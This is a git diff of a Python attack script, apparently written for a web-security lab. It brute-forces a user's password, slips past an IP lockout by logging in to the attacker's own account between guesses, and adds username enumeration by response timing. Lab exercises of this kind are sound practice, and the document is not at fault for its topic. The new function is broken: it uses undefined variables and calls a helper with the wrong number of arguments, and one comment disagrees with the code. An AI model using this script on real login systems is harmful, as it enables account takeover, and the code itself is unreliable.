@@ -1,6 +1,5 @@
 import sys
 
-from datetime import timedelta
 import requests
 import urllib3
 
@@ -53,6 +52,18 @@ def perform_request(url, username, password):
         return None
     return response
 
+# logic for enumerating the usernames
+def enumerate_usernames(url, usernames):
+    hit = ""
+
+    for username in usernames:
+        cleaned_text = username.replace("\n", "")
+        response = perform_request(url, cleaned_text, "test", False, i)
+        if response and response.elapsed > time_taken:
+          time_taken = response.elapsed
+          hit = cleaned_text
+        i+=1
+    return hit, time_taken
 
 # logic for enumerating the passwords
 def brute_password(url, passwords):
@@ -63,10 +74,9 @@ def brute_password(url, passwords):
         # Brute force protection can be bypassed by having the IP owner log into account successfully, so every 4 requests we will login successfully
         print(i)
         if i % 2 == 0:
-          print("here")
           perform_request(url, "wiener", "peter")
         response = perform_request(url, "carlos", cleaned_text)
-        i+=1
+        i += 1
         if response.status_code == 302:
             return cleaned_text
 
@@ -74,10 +84,9 @@ def brute_password(url, passwords):
 def main():
     # ensure proper command line variables were passed
     if len(sys.argv) != 3:
-        print("(+) Usage: %s <url> <passwords.txt>" % sys.argv[0])
+        print(f"(+) Usage: {sys.argv[0]} <url> <passwords.txt>")
         print(
-            "(+) Example: %s www.example.com file/path/passwords"
-            % sys.argv[0]
+            f"(+) Example: {sys.argv[0]} www.example.com file/path/passwords"
         )
         sys.exit(-1)
 
